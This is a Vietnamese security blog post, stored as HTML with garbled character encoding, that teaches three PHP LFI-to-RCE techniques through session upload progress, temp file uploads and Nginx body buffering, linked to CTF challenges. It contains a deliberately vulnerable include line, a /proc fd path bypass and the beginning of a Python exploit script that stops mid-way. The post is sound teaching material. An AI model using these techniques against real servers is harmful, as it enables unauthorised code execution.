<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE" /><meta name="author" content="to^" /><meta property="og:locale" content="en" /><meta name="description" content="M·ªôt v√†i kƒ© thu·∫≠t khai th√°c l·ªó h·ªïng RCE t·ª´ LFI m√† m√¨nh h·ªçc ƒë∆∞·ª£c" /><meta property="og:description" content="M·ªôt v√†i kƒ© thu·∫≠t khai th√°c l·ªó h·ªïng RCE t·ª´ LFI m√† m√¨nh h·ªçc ƒë∆∞·ª£c" /><link rel="canonical" href="https://to016.github.io//posts/PHPLFI2RCE/" /><meta property="og:url" content="https://to016.github.io//posts/PHPLFI2RCE/" /><meta property="og:site_name" content="to^" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-22T20:10:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE" /><meta name="twitter:site" content="@nguyendt0" /><meta name="twitter:creator" content="@to^" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"to^"},"dateModified":"2022-07-11T01:17:14+07:00","datePublished":"2022-05-22T20:10:00+07:00","description":"M·ªôt v√†i kƒ© thu·∫≠t khai th√°c l·ªó h·ªïng RCE t·ª´ LFI m√† m√¨nh h·ªçc ƒë∆∞·ª£c","headline":"C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE","mainEntityOfPage":{"@type":"WebPage","@id":"https://to016.github.io//posts/PHPLFI2RCE/"},"url":"https://to016.github.io//posts/PHPLFI2RCE/"}</script><title>C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE | to^</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="to^"><meta name="application-name" content="to^"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.jpeg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">to^</a></div><div class="site-subtitle font-italic">Student, CTFer, web warrior</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/to016" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/nguyendt0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['todinhnguyen1610','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/PHP_LFI2RCE/RCE.jpg" class="preview-img bg" alt="RCE image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/nguyendt0">T√¥ ƒê·ªânh Nguy√™n</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1653225000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-22 </em> </span> <span> Updated <em class="timeago" data-ts="1657477034" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-07-10 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1723 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p><em>C√°c kƒ© thu·∫≠t trong b√†i vi·∫øt ƒë·ªÅu c√≥ th·ªÉ gi√∫p khai th√°c l·ªói RCE nh∆∞ng c·∫ßn c√≥ s·ª± tr·ª£ gi√∫p c·ªßa LFI</em></p><h2 id="1-php-session-file-upload-progress-exploit"><span class="mr-2">1. PHP Session File Upload Progress Exploit</span><a href="#1-php-session-file-upload-progress-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>ƒê·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c c√°ch khai th√°c n√†y ƒë√≤i h·ªèi m·ªôt v√†i c·∫•u h√¨nh c·ªßa php server, v√¨ v·∫≠y tr∆∞·ªõc ti√™n ta c·∫ßn t√¨m hi·ªÉu v·ªÅ c√°c thi·∫øt l·∫≠p m·∫∑c ƒë·ªãnh trong <code class="language-plaintext highlighter-rouge">php.ini</code>:</p><ul><li><p><code class="language-plaintext highlighter-rouge">session.upload_progress.enabled = on</code> Khi tr√¨nh duy·ªát upload m·ªôt file l√™n server th√¨ php s·∫Ω l∆∞u th√¥ng tin chi ti·∫øt v·ªÅ file n√†y (ch·∫≥ng h·∫°n upload time, upload progress, ‚Ä¶) trong session.</p><li><p><code class="language-plaintext highlighter-rouge">session.upload_progress.cleanup = on </code> Sau khi file upload ho√†n th√†nh, session file s·∫Ω ngay l·∫≠p t·ª©c ƒë∆∞·ª£c x√≥a</p><li><p><code class="language-plaintext highlighter-rouge">session.upload_progress.prefix = "upload_progress_"</code> prefix d√πng v·ªõi upload progress key trong $<em>SESSION. Key n√†y s·∫Ω ƒë∆∞·ª£c concatenated v·ªõi gi√° tr·ªã c·ªßa <code class="language-plaintext highlighter-rouge">session.upload_progress.name</code> ƒë·ªÉ cho ra m·ªôt index duy nh·∫•t. Gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa prefix l√†: ‚Äúupload_progress</em>‚Äù</p><li><p><code class="language-plaintext highlighter-rouge">session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"</code> When it appears in the form, php will report the upload progress. L·ª£i th·∫ø l·ªõn nh·∫•t c·ªßa ta ƒë√≥ l√† gi√° tr·ªã c·ªßa n√≥ c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c.</p><li><p><code class="language-plaintext highlighter-rouge">session.auto_start=Off</code> N·∫øu l√† On th√¨ php s·∫Ω t·ª± ƒë·ªông kh·ªüi t·∫°o session khi nh·∫≠n request v√† kh√¥ng c·∫ßn ph·∫£i th·ª±c thi session_start()</p><li><p><code class="language-plaintext highlighter-rouge">session.use_strict_mode=0</code> Ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c sessionid trong cookie v√† server s·∫Ω t·∫°o session file t∆∞∆°ng ·ª©ng v·ªõi n√≥ ‚Äúsess_sessid‚Äù</p></ul><p><em><strong>Session ƒë∆∞·ª£c b·∫Øt ƒë·∫ßu tr√™n php nh∆∞ th·∫ø n√†o?</strong></em></p><p>ƒê·ªÉ b·∫Øt ƒë·∫ßu m·ªôt PHP session th√¨ ta c·∫ßn h√†m <code class="language-plaintext highlighter-rouge">session_start()</code> ho·∫∑c thay ƒë·ªïi gi√° tr·ªã c·ªßa <code class="language-plaintext highlighter-rouge">session.auto_start</code> trong php.ini th√†nh ON ƒë·ªÉ auto session start Nh∆∞ng gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa n√≥ l√† OFF v√¨ v·∫≠y kh√≥ c√≥ th·ªÉ khai th√°c l·ªói n√†y.</p><p>Ta c√≥ th·ªÉ bypass ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y n·∫øu ta th√™m ‚ÄúPHP_SESSION_UPLOAD_PROGRESS‚Äù trong multipart POST data, PHP s·∫Ω enable session cho ch√∫ng ta.</p><p><em><strong>Session file ƒë∆∞·ª£c l∆∞u nh∆∞ th·∫ø n√†o ?</strong></em></p><p>C√°c file uploaded n√†y s·∫Ω ƒë∆∞·ª£c l∆∞u d·ª±a tr√™n <code class="language-plaintext highlighter-rouge">session.save_path</code> v√† gi√° tr·ªã n√†y th∆∞·ªùng s·∫Ω ƒë∆∞·ª£c thi·∫øt l·∫≠p m·∫∑c ƒë·ªãnh kh√°c nhau trong c√°c phi√™n b·∫£n c·ªßa php c√≥ th·ªÉ l√† <code class="language-plaintext highlighter-rouge">/tmp/sess_{sessionid}</code> ho·∫∑c <code class="language-plaintext highlighter-rouge">/var/lib/php/sessions/sess_{sessionid}</code></p><p><img data-src="/assets/img/PHP_LFI2RCE/1.png" alt="/assets/img/PHP_LFI2RCE/1.png" data-proofer-ignore></p><p><em><strong>L√†m sao ƒë·ªÉ bypass session_upload_progress.cleanup=ON?</strong></em></p><p>Nh∆∞ ƒë√£ n√≥i ·ªü tr√™n thi·∫øt l·∫≠p n√†y l√† m·∫∑c ƒë·ªãnh v√† n√≥ s·∫Ω x√≥a t·∫•t c·∫£ progress information ngay khi ho√†n th√†nh qu√° tr√¨nh ƒë·ªçc d·ªØ li·ªáu t·ª´ POST hay c√°c file session c·ªßa ta (ƒë∆∞·ª£c l∆∞u trong <code class="language-plaintext highlighter-rouge">save_path</code>) s·∫Ω ngay l·∫≠p t·ª©c b·ªã x√≥a.</p><p>V√¨ th·∫ø ta c·∫ßn trigger race condition ƒë·ªÉ bypass v·∫•n ƒë·ªÅ n√†y. D∆∞·ªõi ƒë√¢y l√† c√°ch ƒë·ªÉ race:</p><blockquote class="prompt-tip"><div><p>You can trigger the race condition by creating custom python script to brute force a session file uploaded, by including session file from local file inclusion vulnerability you found in victim site until the file is catched. (Extra: If you can see our previous demo, see the last curl on uploading session, I upload /etc/hostname as a file, you can upload large file to trying to slow down the victim site and (hanging) will result a fast race condition and it will be fast than upload small file).</p></div></blockquote><p><img data-src="/assets/img/PHP_LFI2RCE/2.png" alt="/assets/img/PHP_LFI2RCE/2.png" data-proofer-ignore></p><p>ƒê·ªÉ ƒë·ªçc n·ªôi dung c·ªßa file n√†y ta d√πng v√≤ng l·∫∑p: <img data-src="/assets/img/PHP_LFI2RCE/3.png" alt="/assets/img/PHP_LFI2RCE/3.png" data-proofer-ignore></p><p>Ta th·∫•y r·∫±ng gi√° tr·ªã c·ªßa <code class="language-plaintext highlighter-rouge">PHP_SESSION_UPLOAD_PROGRESS</code> l√† <code class="language-plaintext highlighter-rouge">Abusing PHP_SESION_UPLOAD_PROGRESS</code> ƒë∆∞·ª£c l∆∞u v√†o file session v·∫≠y n·∫øu ta ch√®n m·ªôt ƒëo·∫°n m√£ php v√† include n√≥ th√¥ng qua LFI th√¨ ƒëi·ªÅu g√¨ s·∫Ω x·∫£y ra ? üòä =&gt; RCE</p><p>M·ªôt ƒëi·ªÅu c·∫ßn l∆∞u √Ω n·ªØa ·ªü kƒ© thu·∫≠t n√†y ƒë√≥ l√† file session s·∫Ω ch·ª©a nh·ªØng content r√°c n√™n ƒë√¥i khi kh√¥ng th√≠ch h·ª£p cho m·ªôt s·ªë tr∆∞·ªùng h·ª£p.</p><p><em>Challenge: <a href="https://github.com/to016/CTFs/tree/main/PHP_LFI2RCE_exploit/hitcon-ctf-2018">one-line-php</a> (hitconctf2018)</em></p><h2 id="2-php-temporary-file-upload-exploit"><span class="mr-2">2. PHP Temporary File Upload Exploit</span><a href="#2-php-temporary-file-upload-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>PHP engine khi nh·∫≠n ƒë∆∞·ª£c m·ªôt packet POST s·∫Ω t·∫°o ra m·ªôt ho·∫∑c nhi·ªÅu c√°c temporary files ƒë·ªÉ l∆∞u c√°c uploaded file. PHP script x·ª≠ l√≠ c√°c file upload n√†y s·∫Ω d√πng <code class="language-plaintext highlighter-rouge">move_uploaded_file()</code> ƒë·ªÉ di chuy·ªÉn uploaded temporary file ƒë·∫øn v·ªã tr√≠ mong mu·ªën n·∫øu script c·∫ßn s·ª≠ d·ª•ng ƒë·∫øn file n√†y cho ƒë·∫øn khi ho√†n th√†nh c√¥ng vi·ªác. V√† khi script n√†y ho√†n th√†nh c√¥ng vi·ªác PHP engine s·∫Ω lo·∫°i b·ªè temporary files ·ª©ng v·ªõi files uploaded.</p><p>H√¨nh sau l√† timeline c·ªßa qu√° tr√¨nh ƒë·ªÅ c·∫≠p ·ªü tr√™n:</p><p><img data-src="/assets/img/PHP_LFI2RCE/4.png" alt="/assets/img/PHP_LFI2RCE/4.png" data-proofer-ignore></p><p>V√¨ th·∫ø ta c√≥ th·ªÉ upload m·ªôt PHP script v√† t·∫≠n d·ª•ng l·ªói LFI ƒë·ªÉ include temp file n√†y v√†o t·ª´ ƒë√≥ =&gt; RCE üòä</p><p>Tin t·ªët ·ªü ƒë√¢y l√† PHP script th∆∞·ªùng s·∫Ω access ƒë·∫øn th∆∞ m·ª•c n∆°i m√† temporary files ƒë∆∞·ª£c t·∫°o. Th∆∞ m·ª•c m·∫∑c ƒë·ªãnh th∆∞·ªùng l√† <code class="language-plaintext highlighter-rouge">/tmp</code> tr√™n linux ho·∫∑c <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> tr√™n windows.</p><p>Tin x·∫•u l√† t√™n c·ªßa temp files n√†y l√† random üòû, ƒëi·ªÅu n√†y g√¢y ra s·ª± c·∫£n tr·ªü trong vi·ªác √°p d·ª•ng kƒ© thu·∫≠t n√†y. Tr√™n linux gi√° tr·ªã random n√†y l√† 6 k√≠ t·ª± (A-Za-z0-9) v√† ƒë∆∞·ª£c th√™m v√†o sau ‚Äú/tmp/php‚Äù prefix e.g /tmp/phpUsM123. B·∫•t l·ª£i ·ªü tr√™n d·∫´n ƒë·∫øn vi·ªác mu·ªën kh√°i th√°c l·ªó h·ªïng n√†y c·∫ßn th·ªèa c√°c gi·∫£ thuy·∫øt:</p><p><img data-src="/assets/img/PHP_LFI2RCE/Assuming.png" alt="/assets/img/PHP_LFI2RCE/Assuming.png" data-proofer-ignore></p><p>B√™n c·∫°nh ƒë√≥ t√°c gi·∫£ c·ªßa b√†i nghi√™n c·ª©u v·ªÅ kƒ© thu·∫≠t n√†y c√≤n ƒë·ªÅ c·∫≠p v·ªÅ √Ω t∆∞·ªüng c·ªßa h·ªç:</p><p><img data-src="/assets/img/PHP_LFI2RCE/Idea.png" alt="/assets/img/PHP_LFI2RCE/Idea.png" data-proofer-ignore></p><p>Hmmmm, chung quy l·∫°i th√¨ m·∫•u ch·ªët v·∫´n l√† ph·∫£i t√¨m ƒë∆∞·ª£c t√™n c·ªßa temp file. V√¥ t√¨nh l∆∞·ªõt qua m·ªôt b√†i vi·∫øt tr√™n hacktricks th√¨ h·ªç c√≥ ƒë·ªÅ c·∫≠p th√™m c√°c ƒëi·ªÅu ki·ªán ƒë·ªÉ h·ªó tr·ª£ khai th√°c cho l·ªói n√†y: <code class="language-plaintext highlighter-rouge">LFI with PHPinfo assistance.</code></p><blockquote class="prompt-info"><div><p>To exploit this vulnerability you need: A LFI vulnerability, a page where phpinfo() is displayed, ‚Äúfile_uploads = on‚Äù and the server has to be able to write in the ‚Äú/tmp‚Äù directory.</p></div></blockquote><p>ƒê·∫°i kh√°i l√† s·∫Ω c√≥ m·ªôt trang display content c·ªßa phpinfo() t·ª´ ƒë√≥ ta c√≥ th·ªÉ leak ƒë∆∞·ª£c directory ƒë·∫øn temp file v·ª´a upload th√¥ng qua gi√° tr·ªã c·ªßa bi·∫øn <code class="language-plaintext highlighter-rouge">$_FILES</code>.</p><p>B√™n c·∫°nh ƒë√≥ c√≤n m·ªôt kh√°i ni·ªám li√™n quan l√† PHP output buffering:</p><blockquote class="prompt-info"><div><p>PHP uses a buffer of 4096B and when it is full, it is send to the client. Then the client can send a lot of big requests (using big headers) uploading a php reverse shell, wait for the first part of the phpinfo() to be returned (where the name of the temporary file is) and try to access the temp file before the php server deletes the file exploiting a LFI vulnerability.</p></div></blockquote><p>C√≥ th·ªÉ hi·ªÉu PHP output buffering nh∆∞ sau</p><p><img data-src="/assets/img/PHP_LFI2RCE/PHPOutputBuffer.png" alt="PHPOutputBuffer" data-proofer-ignore></p><p><em>Challenge: <a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/">easy php</a> (n1ctf2018)</em></p><h2 id="3-php-lfi-with-nginx-assistance"><span class="mr-2">3. PHP LFI with Nginx Assistance</span><a href="#3-php-lfi-with-nginx-assistance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Section n√†y n√≥i v·ªÅ kƒ© thu·∫≠t khai th√°c c≈©ng d·ª±a tr√™n LFI nh∆∞ng ƒë·∫∑c bi·ªát h∆°n ·ªü ch·ªó PHP ƒë∆∞·ª£c k·∫øt h·ª£p v·ªõi Nginx server d∆∞·ªõi m·ªôt v√†i c·∫•u h√¨nh ƒë·∫∑c tr∆∞ng.</p><p>C√°c kƒ© thu·∫≠t ƒë√£ n√≥i ·ªü tr√™n d·ªÅu d·ª±a v√†o vi·ªác th·ª±c hi·ªán LFI ƒë·ªëi v·ªõi session file ho·∫∑c temp file ƒë·ªÉ RCE. H√£y xem m·ªôt v√≠ d·ª• cho tr∆∞·ªùng h·ª£p c√°c tricks ·ªü tr√™n kh√¥ng th·ªÉ d√πng ƒë∆∞·ª£c:</p><p>Source code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]);</span>
</pre></table></code></div></div><p>FPM / PHP config:</p><div class="language-conf highlighter-rouge"><div class="code-header"> <span data-label-text="Conf"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">php_admin_value</span>[<span class="n">session</span>.<span class="n">upload_progress</span>.<span class="n">enabled</span>] = <span class="m">0</span>
<span class="n">php_admin_value</span>[<span class="n">file_uploads</span>] = <span class="m">0</span>
</pre></table></code></div></div><p>V√† setup permission ƒë·ªÉ kh√¥ng th·ªÉ include file t·ª´ 2 folder n√†y</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>chown -R 0:0 /tmp /var/tmp /var/lib/php/sessions
chmod -R 000 /tmp /var/tmp /var/lib/php/sessions
</pre></table></code></div></div><p>May m·∫Øn thay, PHP hi·ªán nay th∆∞·ªùng ƒë∆∞·ª£c deployed th√¥ng qua PHP-FPM v√† Nginx. Nginx cung c·∫•p m·ªôt c∆° ch·∫ø ƒë·ªÉ qu·∫£n l√≠ requests body size g·ªçi l√† <a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">client body buffering</a>. N·∫øu client body l·ªõn h∆°n m·ªôt gi√° tr·ªã ƒë√£ c·∫•u h√¨nh tr∆∞·ªõc th√¨ s·∫Ω b·∫Øt ƒë·∫ßu t·∫°o ra temporary files v√† ghi v√†o ƒë√≥. V√† t√≠nh nƒÉng n√†y v√¥ t√¨nh l√†m cho LFI2RCE tr·ªü n√™n kh·∫£ thi üò¨.</p><p>Temp file n√†y s·∫Ω ƒë∆∞·ª£c x√≥a ngay sau khi ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi Nginx. Nh∆∞ng ta c√≥ th·ªÉ l·ª£i d·ª•ng <code class="language-plaintext highlighter-rouge">procfs</code> ƒë·ªÉ tham chi·∫øu n√≥ th√¥ng qua race condition:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>/proc/34/fd:
total 0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -&gt; /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -&gt; /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -&gt; anon_inode:[eventfd]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -&gt; socket:[27587]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -&gt; socket:[27589]
lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -&gt; socket:[44926]
lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -&gt; socket:[44927]
lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -&gt; /var/lib/nginx/body/0000001368 (deleted)
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>One cannot directly include /proc/34/fd/15 in this example as PHP‚Äôs include function would resolve the path to /var/lib/nginx/body/0000001368 (deleted) which doesn‚Äôt exist in in the filesystem. This minor restriction can luckily be bypassed by some indirection like: /proc/self/fd/34/../../../34/fd/15 which will finally execute the content of the deleted /var/lib/nginx/body/0000001368 file.</p></div></blockquote><p><em>Challenge: a simple <a href="https://github.com/to016/CTFs/tree/main/PHP_LFI2RCE_exploit/php-lfi-with-nginx-assistance">challenge</a> for approach</em></p><p>√Ä m·ªôt l∆∞u √Ω n·ªØa ƒë√≥ l√† c√°ch n√†y ch·ªâ d√πng ƒë∆∞·ª£c khi Nginx ch·∫°y v·ªõi c√πng user c·ªßa PHP (th∆∞·ªùng l√† www-data). L√≠ do th√¨ m√¨nh c√≥ mail h·ªèi t√°c gi·∫£ v√† h·ªç rep nh∆∞ sau:</p><p><img data-src="/assets/img/PHP_LFI2RCE/rep.png" alt="rep" data-proofer-ignore></p><p>script exploit:</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">threading</span><span class="p">,</span> <span class="n">requests</span>

<span class="c1"># exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details
</span>
<span class="n">URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s">/'</span>

<span class="c1"># find nginx worker processes 
</span><span class="n">r</span>  <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
    <span class="s">'file'</span><span class="p">:</span> <span class="s">'/proc/cpuinfo'</span>
<span class="p">})</span>
